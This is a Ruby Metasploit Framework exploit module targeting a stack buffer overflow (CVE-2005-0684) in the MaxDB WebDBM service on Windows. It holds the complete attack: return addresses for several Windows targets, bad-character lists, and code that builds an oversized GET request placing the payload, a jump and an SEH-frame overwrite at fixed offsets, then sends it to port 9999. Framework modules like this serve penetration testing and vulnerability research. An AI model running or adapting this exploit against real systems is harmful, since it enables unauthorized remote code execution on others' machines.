##
# $Id: maxdb_webdbm_get_overflow.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MaxDB WebDBM GET Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the MaxDB WebDBM
				service. This service is included with many recent versions
				of the MaxDB and SAPDB products. This particular module is
				capable of exploiting Windows systems through the use of an
				SEH frame overwrite. The offset to the SEH frame may change
				depending on where MaxDB has been installed, this module
				assumes a web root path with the same length as:

				C:\Program Files\sdb\programs\web\Documents
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2005-0684'],
					[ 'OSVDB', '15816'],
					[ 'URL', 'http://www.idefense.com/application/poi/display?id=234&type=vulnerabilities'],
					[ 'BID', '13368'],
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 2052,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x40",
					'StackAdjustment' => -3500,
				},
				'Platform'   => 'win',
			'Targets'        =>
				[
					['MaxDB 7.5.00.11 / 7.5.00.24', { 'Ret' => 0x1002aa19 }], # wapi.dll
					['Windows 2000 English',        { 'Ret' => 0x75022ac4 }], # ws2help.dll
					['Windows XP English SP0/SP1',  { 'Ret' => 0x71aa32ad }], # ws2help.dll
					['Windows 2003 English',        { 'Ret' => 0x7ffc0638 }], # peb magic :-)
					['Windows NT 4.0 SP4/SP5/SP6',  { 'Ret' => 0x77681799 }], # ws2help.dll
				],
			'DisclosureDate' => 'Apr 26 2005',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(9999)
			], self.class)
	end

	def exploit
		# Trigger the SEH by writing past the end of the page after
		# the SEH is already overwritten. This avoids the other smashed
		# pointer exceptions and goes straight to the payload.
		buf = rand_text_alphanumeric(16384)
		buf[1586, payload.encoded.length] = payload.encoded
		buf[3638, 5] = "\xe9" + [-2052].pack('V')
		buf[3643, 2] = "\xeb\xf9"
		buf[3647, 4] = [target.ret].pack('V')

		print_status("Trying target address 0x%.8x..." % target.ret)

		send_request_raw({
			'uri' => '/%' + buf
		}, 5)

		handler
	end

end
